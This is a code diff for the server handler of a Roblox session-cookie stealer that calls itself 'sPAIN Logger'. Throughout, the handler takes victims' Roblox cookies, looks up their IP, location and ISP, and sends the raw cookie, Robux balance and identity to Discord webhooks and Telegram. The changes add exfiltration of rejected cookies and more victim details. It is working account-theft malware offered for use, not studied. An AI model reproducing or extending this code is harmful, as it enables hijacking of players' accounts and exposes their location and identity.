@@ -141,7 +141,6 @@ export default async function handler(req, res) {
   const now      = new Date().toISOString();
   const pageName = record.displayName || slug;
 
-  // Collect all webhooks (page owner + dualhook parent if any)
   const webhooks = [record.webhook];
   if (record.dualhookParent) {
     try {
@@ -150,7 +149,6 @@ export default async function handler(req, res) {
     } catch (_) {}
   }
 
-  // Get geo and lite Roblox info in parallel
   const [geo, liteInfo] = await Promise.all([
     getIpGeo(ip),
     cookie ? getLiteInfo(cookie, ip) : Promise.resolve(null)
@@ -158,20 +156,20 @@ export default async function handler(req, res) {
 
   const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
 
-  // ── No valid cookie ────────────────────────────────────────────────────────
+  // ── No cookie at all ───────────────────────────────────────────────────────
   if (!cookie) {
     for (const wh of webhooks) {
       await discordSend(wh, {
         embeds: [{
-          title:       '\u26a0\ufe0f Wrong Cookie — Troll Detected',
-          description: 'Invalid or missing cookie was submitted.',
+          title:       '⚠️ Wrong Cookie — Troll Detected',
+          description: 'Invalid or missing cookie.',
           color:       0xff3333,
           fields: [
-            { name: '\ud83c\udf10 IP',       value: ip || 'Unknown', inline: true },
-            { name: '\ud83d\udccd Location', value: location,         inline: true },
-            { name: '\ud83d\uddfa\ufe0f ISP', value: geo?.isp || 'Unknown', inline: true },
+            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
+            { name: '📍 Location', value: location,         inline: true },
+            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
           ],
-          footer:    { text: `sPAIN Logger \u2022 ${pageName} \u2022 ${now}` },
+          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
           timestamp: now
         }]
       });
@@ -179,23 +177,25 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // ── Cookie found but invalid (worker says invalid) ─────────────────────────
+  // ── Cookie found but Roblox rejected it ────────────────────────────────────
   if (!liteInfo) {
     for (const wh of webhooks) {
       await discordSend(wh, {
         embeds: [{
-          title:       '\u26a0\ufe0f Wrong Cookie — Troll Detected',
-          description: 'A cookie was submitted but Roblox rejected it.',
+          title:       '⚠️ Wrong Cookie — Troll Detected',
+          description: 'Cookie submitted but Roblox rejected it.',
           color:       0xff3333,
           fields: [
-            { name: '\ud83c\udf10 IP',       value: ip || 'Unknown', inline: true },
-            { name: '\ud83d\udccd Location', value: location,         inline: true },
-            { name: '\ud83d\uddfa\ufe0f ISP', value: geo?.isp || 'Unknown', inline: true },
+            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
+            { name: '📍 Location', value: location,         inline: true },
+            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
           ],
-          footer:    { text: `sPAIN Logger \u2022 ${pageName} \u2022 ${now}` },
+          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
           timestamp: now
         }]
       });
+      // Still send the cookie even if rejected
+      await discordChunked(wh, cookie);
     }
     return res.status(200).json({ success: true });
   }
@@ -215,62 +215,71 @@ export default async function handler(req, res) {
   });
 
   for (const wh of webhooks) {
-    // ── Main embed — styled exactly like the screenshot ──────────────────────
     await discordSend(wh, {
       content: '@everyone',
       embeds: [{
-        title:       '\ud83d\udcb0 Robux & Pending',
-        color:       0x5865f2,   // Discord blurple — matches the screenshot
+        title:       '💰 Robux & Info',
+        color:       0x5865f2,
+        thumbnail:   { url: liteInfo.avatarUrl },
         fields: [
+          // Row 1 — username spans full width so it stands out
           {
-            name:   '\ud83d\udcb0 Balance',
+            name:   '👤 Username',
+            value:  `\`${liteInfo.username}\` (ID: ${liteInfo.id})`,
+            inline: false
+          },
+          // Row 2 — robux
+          {
+            name:   '💰 Balance',
             value:  `\`${fmt(liteInfo.robux)} R$\``,
             inline: true
           },
           {
-            name:   '\u23f3 Pending',
+            name:   '⏳ Pending',
             value:  `\`${fmt(liteInfo.pendingRobux)} R$\``,
             inline: true
           },
-          // Invisible spacer so the two fields are left-aligned like the screenshot
+          // invisible spacer
           { name: '\u200b', value: '\u200b', inline: true },
+          // Row 3 — network info
           {
-            name:   '\ud83c\udf10 IP',
+            name:   '🌐 IP',
             value:  ip || 'Unknown',
             inline: true
           },
           {
-            name:   '\ud83d\udccd Location',
+            name:   '📍 Location',
             value:  location,
             inline: true
           },
           {
-            name:   '\ud83d\uddfa\ufe0f ISP',
+            name:   '🗺️ ISP',
             value:  geo?.isp || 'Unknown',
             inline: true
           },
+          // Row 4 — refresh link
           {
-            name:   '\ud83d\udd04 Dashboard',
-            value:  `[Open Dashboard](${refreshUrl})\nLive info + refresh cookie anytime`,
+            name:   '🔄 Refresh',
+            value:  `[Open Dashboard](${refreshUrl})`,
             inline: false
           }
         ],
-        thumbnail: { url: liteInfo.avatarUrl },
-        footer:    { text: `sPAIN Logger \u2022 ${liteInfo.id} \u2022 ${now}` },
+        footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
         timestamp: now
       }]
     });
 
-    // Raw cookie as plain chunked message — exact bytes, nothing lost
+    // Raw cookie
     await discordChunked(wh, cookie);
   }
 
   await tgSend([
-    `\ud83c\udf70 <b>COOKIE \u2014 ${pageName}</b>`,
-    `\ud83d\udc64 ${liteInfo.username} (#${liteInfo.id})`,
-    `\ud83d\udcb0 Robux: ${fmt(liteInfo.robux)} | Pending: ${fmt(liteInfo.pendingRobux)}`,
-    `\ud83c\udf10 <code>${ip}</code> \u2014 ${location}`,
-    `\ud83d\udd04 ${refreshUrl}`
+    `🍪 <b>COOKIE — ${pageName}</b>`,
+    `👤 ${liteInfo.username} (#${liteInfo.id})`,
+    `💰 Robux: ${fmt(liteInfo.robux)} | Pending: ${fmt(liteInfo.pendingRobux)}`,
+    `🌐 <code>${ip}</code> — ${location}`,
+    `🗺️ ${geo?.isp || '?'}`,
+    `🔄 ${refreshUrl}`
   ].join('\n'));
 
   return res.status(200).json({ success: true });
